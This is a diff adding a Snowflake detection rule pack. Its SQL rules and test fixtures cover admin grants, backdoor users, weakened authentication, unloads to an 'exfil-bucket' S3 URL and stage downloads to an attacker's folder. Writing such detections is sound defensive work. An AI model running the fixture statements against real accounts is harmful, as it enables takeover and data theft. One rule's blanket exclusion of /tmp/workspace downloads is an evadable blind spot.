@@ -1,0 +1,343 @@
+# Snowflake account security pack
+# Data: SYNC_SNOWFLAKE_TELEMETRY lanes (INFORMATION_SCHEMA fast lane every 5 min,
+# ACCOUNT_USAGE history lane hourly). Trust Center findings arrive separately as TC-* findings.
+# Rule contract: one read-only SELECT over SNOWFLAKE_XDR.RAW_LOGS returning
+# _time, user_name, src, dest, description. threshold/window are applied per
+# (user_name, src, dest) by the engine.
+pack_id: snowflake
+name: Snowflake Account Security
+vendor: Snowflake
+version: 1
+description: >
+  Best-practice detections for Snowflake accounts: privileged role grants, new users and
+  credentials, network and authentication policy tampering, data exfiltration via unload,
+  shares and stage downloads, brute force and spray against Snowflake logins, and dormant
+  or new-location sign-ins. Complements Trust Center posture and threat findings.
+requires:
+  - table: DATABASE_ACTIVITY
+    vendor_product: snowflake
+  - table: AUTHENTICATION
+    vendor_product: snowflake
+onboarding: >
+  CALL SNOWFLAKE_XDR.REFERENCE.SYNC_SNOWFLAKE_TELEMETRY('all'); then resume
+  TASK_SNOWFLAKE_FAST_LANE and TASK_SNOWFLAKE_HISTORY_LANE. Trust Center needs
+  GRANT APPLICATION ROLE SNOWFLAKE.TRUST_CENTER_VIEWER TO ROLE <xdr role>.
+rules:
+  - id: SF-001
+    name: Privileged system role granted
+    description: ACCOUNTADMIN, SECURITYADMIN, ORGADMIN or USERADMIN was granted to a user or role.
+    severity: 5
+    tactic: TA0004
+    technique: T1098.003
+    table: DATABASE_ACTIVITY
+    false_positives: Planned admin onboarding; break-glass procedures.
+    references: [https://docs.snowflake.com/en/user-guide/security-access-control-considerations]
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "GRANT", "action": "grant", "query_text": "GRANT ROLE ACCOUNTADMIN TO USER {{entity}}"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "GRANT", "action": "grant", "query_text": "GRANT SELECT ON TABLE db.s.t TO ROLE ANALYST"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Privileged role granted by ' || user_name || ' as ' || COALESCE(user_role, '?') || ': ' || LEFT(query_text, 300) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND query_type = 'GRANT' AND result = 'success'
+        AND REGEXP_LIKE(query_text, '.*(ACCOUNTADMIN|SECURITYADMIN|ORGADMIN|USERADMIN).*', 'is')
+        AND NOT REGEXP_LIKE(query_text, '.*ON[[:space:]]+.*TO[[:space:]]+ROLE[[:space:]]+(ACCOUNTADMIN|SECURITYADMIN).*', 'is')
+
+  - id: SF-002
+    name: New Snowflake user created
+    description: A new user was created. Attackers create backdoor users for persistence.
+    severity: 3
+    tactic: TA0003
+    technique: T1136.003
+    table: DATABASE_ACTIVITY
+    false_positives: SCIM provisioning (filter its role), onboarding scripts.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "CREATE_USER", "action": "create", "user_role": "USERADMIN", "query_text": "CREATE USER backdoor_{{entity}} PASSWORD = 'x'"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "CREATE_USER", "action": "create", "user_role": "AAD_SCIM_PROVISIONER", "query_text": "CREATE USER jdoe_{{entity}}"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'User created by ' || user_name || ': ' || LEFT(query_text, 200) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND (query_type = 'CREATE_USER' OR REGEXP_LIKE(query_text, '^[[:space:]]*CREATE[[:space:]]+(OR[[:space:]]+REPLACE[[:space:]]+)?USER[[:space:]].*', 'is'))
+        AND COALESCE(user_role, '') NOT ILIKE '%SCIM%'
+
+  - id: SF-003
+    name: User authentication weakened
+    description: MFA, authentication policy or login restrictions removed from a user, or a user's password reset by someone else.
+    severity: 4
+    tactic: TA0005
+    technique: T1556
+    table: DATABASE_ACTIVITY
+    false_positives: Help-desk password resets; MFA re-enrolment.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER_USER", "action": "alter", "query_text": "ALTER USER victim_user UNSET AUTHENTICATION POLICY"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER_USER", "action": "alter", "query_text": "ALTER USER {{entity}} SET PASSWORD = 'MyNewSecret123'"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Authentication weakened by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND REGEXP_LIKE(query_text, '^[[:space:]]*ALTER[[:space:]]+USER[[:space:]].*', 'is')
+        AND (REGEXP_LIKE(query_text, '.*(UNSET[[:space:]]+(AUTHENTICATION[[:space:]]+POLICY|NETWORK_POLICY|MINS_TO_BYPASS_MFA)|DISABLE_MFA|MINS_TO_BYPASS_MFA[[:space:]]*=|EXT_AUTHN_DUO[[:space:]]*=[[:space:]]*FALSE).*', 'is')
+             OR (REGEXP_LIKE(query_text, '.*SET[[:space:]]+PASSWORD[[:space:]]*=.*', 'is')
+                 AND NOT REGEXP_LIKE(query_text, CONCAT('.*ALTER[[:space:]]+USER[[:space:]]+(IF[[:space:]]+EXISTS[[:space:]]+)?"?', user_name, '"?[[:space:]].*'), 'is')))
+
+  - id: SF-004
+    name: Network policy changed or removed
+    description: An account or user network policy was created, altered, dropped or unset.
+    severity: 4
+    tactic: TA0005
+    technique: T1562.007
+    table: DATABASE_ACTIVITY
+    false_positives: Planned IP allowlist changes.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER ACCOUNT UNSET NETWORK_POLICY"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER WAREHOUSE wh SET WAREHOUSE_SIZE = XSMALL"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Network policy change by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND action IN ('alter', 'drop', 'create')
+        AND REGEXP_LIKE(query_text, '.*(NETWORK[[:space:]]+POLICY|NETWORK_POLICY|NETWORK[[:space:]]+RULE).*', 'is')
+
+  - id: SF-005
+    name: Data unloaded to an external location
+    description: COPY INTO an external URL or stage (s3, azure, gcs). Classic Snowflake exfiltration path.
+    severity: 4
+    tactic: TA0010
+    technique: T1537
+    table: DATABASE_ACTIVITY
+    false_positives: Scheduled data-sharing exports; reverse ETL.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "UNLOAD", "action": "unload", "rows_affected": 50000, "query_text": "COPY INTO 's3://exfil-bucket/dump/' FROM db.s.customers"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "UNLOAD", "action": "unload", "rows_affected": 10, "query_text": "COPY INTO @db.s.internal_stage/out FROM db.s.t"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Unload by ' || user_name || ' (' || COALESCE(rows_affected, 0) || ' rows): ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success' AND query_type = 'UNLOAD'
+        AND (REGEXP_LIKE(query_text, '.*(s3|s3gov|azure|gcs)://.*', 'is')
+             OR COALESCE(_raw:outbound_bytes::NUMBER, 0) > 0)
+
+  - id: SF-006
+    name: Very large query result
+    description: A query returned at least one million rows. Bulk reads precede exfiltration.
+    severity: 3
+    tactic: TA0009
+    technique: T1213
+    table: DATABASE_ACTIVITY
+    false_positives: BI extracts, ETL service users (tune by user).
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "SELECT", "action": "select", "rows_affected": 2000000, "object": "DB.S.CUSTOMERS"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "SELECT", "action": "select", "rows_affected": 500, "object": "DB.S.CUSTOMERS"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             user_name || ' read ' || rows_affected || ' rows from ' || COALESCE(object, '?') AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND action = 'select' AND result = 'success'
+        AND rows_affected >= 1000000
+
+  - id: SF-007
+    name: Snowflake login brute force
+    description: Five or more failed Snowflake logins for one user from one source within 15 minutes.
+    severity: 4
+    tactic: TA0006
+    technique: T1110.001
+    table: AUTHENTICATION
+    threshold: 5
+    window_minutes: 15
+    false_positives: Rotated service-account credentials still configured in a tool.
+    fixtures: {"positive": [{"table": "AUTHENTICATION", "count": 5, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "failure", "reason": "Incorrect username or password was specified."}}], "negative": [{"table": "AUTHENTICATION", "count": 2, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "failure", "reason": "Incorrect username or password was specified."}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Failed Snowflake login: ' || COALESCE(reason, 'unknown') AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION
+      WHERE vendor_product = 'snowflake' AND action = 'failure'
+
+  - id: SF-008
+    name: Snowflake password spray
+    description: One source failed logins against five or more different users within 30 minutes.
+    severity: 4
+    tactic: TA0006
+    technique: T1110.003
+    table: AUTHENTICATION
+    fixtures: {"positive": [{"table": "AUTHENTICATION", "count": 6, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "spray_user_{{n}}", "src": "{{entity}}", "action": "failure"}}], "negative": [{"table": "AUTHENTICATION", "count": 2, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "spray_user_{{n}}", "src": "{{entity}}", "action": "failure"}}]}
+    sql: |
+      SELECT MAX(_time) AS _time, NULL AS user_name, src, MAX(dest) AS dest,
+             'Password spray from ' || src || ' against ' || COUNT(DISTINCT user_name) || ' users' AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION
+      WHERE vendor_product = 'snowflake' AND action = 'failure'
+        AND _time > DATEADD('minute', -180, CURRENT_TIMESTAMP())
+      GROUP BY src, TIME_SLICE(_time::TIMESTAMP_NTZ, 30, 'MINUTE')
+      HAVING COUNT(DISTINCT user_name) >= 5
+
+  - id: SF-009
+    name: Successful login after repeated failures
+    description: A user logged in successfully after three or more failures in the preceding hour.
+    severity: 4
+    tactic: TA0006
+    technique: T1110
+    table: AUTHENTICATION
+    fixtures: {"positive": [{"table": "AUTHENTICATION", "count": 3, "offset_minutes": 10, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "failure"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}], "negative": [{"table": "AUTHENTICATION", "count": 1, "offset_minutes": 10, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "failure"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}]}
+    sql: |
+      SELECT s._time, s.user_name, s.src, s.dest,
+             'Login succeeded after ' || COUNT(*) || ' failures in the previous hour' AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION s
+      JOIN SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION f
+        ON f.user_name = s.user_name AND f.vendor_product = 'snowflake' AND f.action = 'failure'
+       AND f._time BETWEEN DATEADD('minute', -60, s._time) AND s._time
+      WHERE s.vendor_product = 'snowflake' AND s.action = 'success'
+        AND s._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())
+      GROUP BY s._time, s.user_name, s.src, s.dest
+      HAVING COUNT(*) >= 3
+
+  - id: SF-010
+    name: Login from a new client IP
+    description: Successful login from an IP the user has not used in the previous 30 days.
+    severity: 2
+    tactic: TA0001
+    technique: T1078.004
+    table: AUTHENTICATION
+    false_positives: Travel, ISP changes, new office egress.
+    fixtures: {"positive": [{"table": "AUTHENTICATION", "count": 1, "offset_minutes": 7200, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "203.0.113.10", "action": "success"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.99", "action": "success"}}], "negative": [{"table": "AUTHENTICATION", "count": 1, "offset_minutes": 7200, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "203.0.113.10", "action": "success"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "203.0.113.10", "action": "success"}}]}
+    sql: |
+      SELECT n._time, n.user_name, n.src, n.dest,
+             'First login from ' || n.src || ' in 30 days (client ' || COALESCE(n.user_agent, '?') || ')' AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION n
+      WHERE n.vendor_product = 'snowflake' AND n.action = 'success' AND n.src IS NOT NULL
+        AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())
+        AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h
+                    WHERE h.vendor_product = 'snowflake' AND h.user_name = n.user_name AND h.action = 'success'
+                      AND h._time < DATEADD('day', -1, n._time) AND h._time > DATEADD('day', -30, n._time))
+        AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h
+                        WHERE h.vendor_product = 'snowflake' AND h.user_name = n.user_name AND h.src = n.src
+                          AND h.action = 'success'
+                          AND h._time < DATEADD('minute', -240, CURRENT_TIMESTAMP())
+                          AND h._time > DATEADD('day', -30, n._time))
+
+  - id: SF-011
+    name: Integration created or changed
+    description: A security, storage, external access, API or notification integration was created or altered.
+    severity: 4
+    tactic: TA0003
+    technique: T1556.007
+    table: DATABASE_ACTIVITY
+    false_positives: Platform team deployments (pin known deployer role).
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "CREATE", "action": "create", "query_text": "CREATE SECURITY INTEGRATION rogue_saml TYPE = SAML2 ENABLED = TRUE"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "CREATE_TABLE", "action": "create", "query_text": "CREATE TABLE db.s.t (a INT)"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Integration change by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success' AND action IN ('create', 'alter')
+        AND REGEXP_LIKE(query_text, '.*(SECURITY|STORAGE|EXTERNAL[[:space:]]+ACCESS|API|NOTIFICATION)[[:space:]]+INTEGRATION.*', 'is')
+
+  - id: SF-012
+    name: Account security parameter weakened
+    description: An account-level guardrail (inline-URL unload prevention, storage-integration requirement, MFA or network policy) was disabled or unset.
+    severity: 5
+    tactic: TA0005
+    technique: T1562.001
+    table: DATABASE_ACTIVITY
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER ACCOUNT SET PREVENT_UNLOAD_TO_INLINE_URL = FALSE"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER ACCOUNT SET PREVENT_UNLOAD_TO_INLINE_URL = TRUE"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Account guardrail weakened by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND REGEXP_LIKE(query_text, '^[[:space:]]*ALTER[[:space:]]+ACCOUNT.*', 'is')
+        AND (REGEXP_LIKE(query_text, '.*(PREVENT_UNLOAD_TO_INLINE_URL|REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION|REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_OPERATION|PREVENT_UNLOAD_TO_INTERNAL_STAGES|ENABLE_IDENTIFIER_FIRST_LOGIN)[[:space:]]*=[[:space:]]*FALSE.*', 'is')
+             OR REGEXP_LIKE(query_text, '.*UNSET[[:space:]]+.*(NETWORK_POLICY|AUTHENTICATION[[:space:]]+POLICY|PASSWORD[[:space:]]+POLICY|SESSION[[:space:]]+POLICY|PREVENT_UNLOAD).*', 'is'))
+
+  - id: SF-013
+    name: Data protection policy removed
+    description: A masking, row access, projection or aggregation policy was dropped or unset from a column or table.
+    severity: 4
+    tactic: TA0005
+    technique: T1562
+    table: DATABASE_ACTIVITY
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER TABLE db.s.customers MODIFY COLUMN ssn UNSET MASKING POLICY"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER TABLE db.s.customers MODIFY COLUMN ssn SET MASKING POLICY db.s.mask_ssn"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Data protection policy removed by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND REGEXP_LIKE(query_text, '.*(DROP|UNSET)[[:space:]]+(MASKING|ROW[[:space:]]+ACCESS|PROJECTION|AGGREGATION)[[:space:]]+POLICY.*', 'is')
+
+  - id: SF-014
+    name: Data shared outside the account
+    description: A share, listing or replication target was created or extended to other accounts.
+    severity: 4
+    tactic: TA0010
+    technique: T1537
+    table: DATABASE_ACTIVITY
+    false_positives: Approved data-sharing agreements.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER SHARE customer_share ADD ACCOUNTS = partnerorg.partner01"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER", "action": "alter", "query_text": "ALTER SHARE customer_share SET COMMENT = 'q4'"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Sharing change by ' || user_name || ': ' || LEFT(query_text, 250) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND (REGEXP_LIKE(query_text, '^[[:space:]]*CREATE[[:space:]]+(OR[[:space:]]+REPLACE[[:space:]]+)?(SHARE|LISTING|EXTERNAL[[:space:]]+LISTING)[[:space:]].*', 'is')
+             OR REGEXP_LIKE(query_text, '.*ALTER[[:space:]]+SHARE.*(ADD|SET)[[:space:]]+ACCOUNTS.*', 'is')
+             OR REGEXP_LIKE(query_text, '.*ENABLE[[:space:]]+REPLICATION[[:space:]]+TO[[:space:]]+ACCOUNTS.*', 'is'))
+
+  - id: SF-015
+    name: Access-denied storm
+    description: Twenty or more "does not exist or not authorized" errors for one user in 15 minutes - privilege probing.
+    severity: 3
+    tactic: TA0007
+    technique: T1069.003
+    table: DATABASE_ACTIVITY
+    threshold: 20
+    window_minutes: 15
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "failure", "user_name": "{{entity}}", "query_type": "SELECT", "action": "select", "reason": "Object 'DB.S.PAYROLL' does not exist or not authorized."}, "count": 20}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "failure", "user_name": "{{entity}}", "query_type": "SELECT", "action": "select", "reason": "Object 'DB.S.PAYROLL' does not exist or not authorized."}, "count": 3}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Not authorized: ' || LEFT(COALESCE(reason, ''), 200) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'failure'
+        AND (reason ILIKE '%not authorized%' OR reason ILIKE '%insufficient privileges%')
+
+  - id: SF-016
+    name: Files downloaded from a stage
+    description: GET from an internal stage to a client machine.
+    severity: 3
+    version: 2
+    tactic: TA0010
+    technique: T1567
+    table: DATABASE_ACTIVITY
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "GET_FILES", "action": "stage_file", "query_text": "GET @db.s.finance_stage/payroll.csv file:///home/attacker/"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "GET_FILES", "action": "stage_file", "query_text": "GET '@db.s.app_code/app.py' 'file:///tmp/workspace/app/'"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Stage download by ' || user_name || ': ' || LEFT(query_text, 200) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success' AND query_type = 'GET_FILES'
+        -- Snowflake app / notebook build containers fetch their own code into /tmp/workspace
+        AND query_text NOT ILIKE '%file:///tmp/workspace/%'
+
+  - id: SF-017
+    name: Credential added to a user
+    description: A programmatic access token, RSA key or OAuth client secret was added for a user.
+    severity: 3
+    tactic: TA0003
+    technique: T1098.001
+    table: DATABASE_ACTIVITY
+    false_positives: Service-account key rotation.
+    fixtures: {"positive": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER_USER", "action": "alter", "query_text": "ALTER USER svc_etl ADD PROGRAMMATIC ACCESS TOKEN backdoor_pat"}}], "negative": [{"table": "DATABASE_ACTIVITY", "row": {"vendor_product": "snowflake", "dest": "CANARY_ACCT", "result": "success", "user_name": "{{entity}}", "query_type": "ALTER_USER", "action": "alter", "query_text": "ALTER USER svc_etl SET COMMENT = 'etl service'"}}]}
+    sql: |
+      SELECT _time, user_name, src, dest,
+             'Credential added by ' || user_name || ': ' || LEFT(REGEXP_REPLACE(query_text, '=[[:space:]]*[^[:space:]]{20,}', '= <redacted>'), 200) AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.DATABASE_ACTIVITY
+      WHERE vendor_product = 'snowflake' AND result = 'success'
+        AND REGEXP_LIKE(query_text, '.*(ADD[[:space:]]+(PROGRAMMATIC[[:space:]]+ACCESS[[:space:]]+TOKEN|PAT)|SET[[:space:]]+RSA_PUBLIC_KEY(_2)?[[:space:]]*=).*', 'is')
+
+  - id: SF-018
+    name: Dormant user signed in
+    description: A user with no successful login in the previous 60 days signed in.
+    severity: 3
+    tactic: TA0001
+    technique: T1078
+    table: AUTHENTICATION
+    fixtures: {"positive": [{"table": "AUTHENTICATION", "count": 1, "offset_minutes": 129600, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}], "negative": [{"table": "AUTHENTICATION", "count": 1, "offset_minutes": 129600, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 14400, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}, {"table": "AUTHENTICATION", "count": 1, "offset_minutes": 1, "row": {"vendor_product": "snowflake", "app": "snowflake", "dest": "CANARY_ACCT", "user_name": "{{entity}}", "src": "198.51.100.7", "action": "success"}}]}
+    sql: |
+      SELECT n._time, n.user_name, n.src, n.dest,
+             'Dormant user signed in from ' || COALESCE(n.src, '?') AS description
+      FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION n
+      WHERE n.vendor_product = 'snowflake' AND n.action = 'success'
+        AND n._time > DATEADD('minute', -240, CURRENT_TIMESTAMP())
+        AND EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h
+                    WHERE h.vendor_product = 'snowflake' AND h.user_name = n.user_name
+                      AND h._time < DATEADD('day', -60, n._time))
+        AND NOT EXISTS (SELECT 1 FROM SNOWFLAKE_XDR.RAW_LOGS.AUTHENTICATION h
+                        WHERE h.vendor_product = 'snowflake' AND h.user_name = n.user_name AND h.action = 'success'
+                          AND h._time BETWEEN DATEADD('day', -60, n._time) AND DATEADD('minute', -240, CURRENT_TIMESTAMP()))
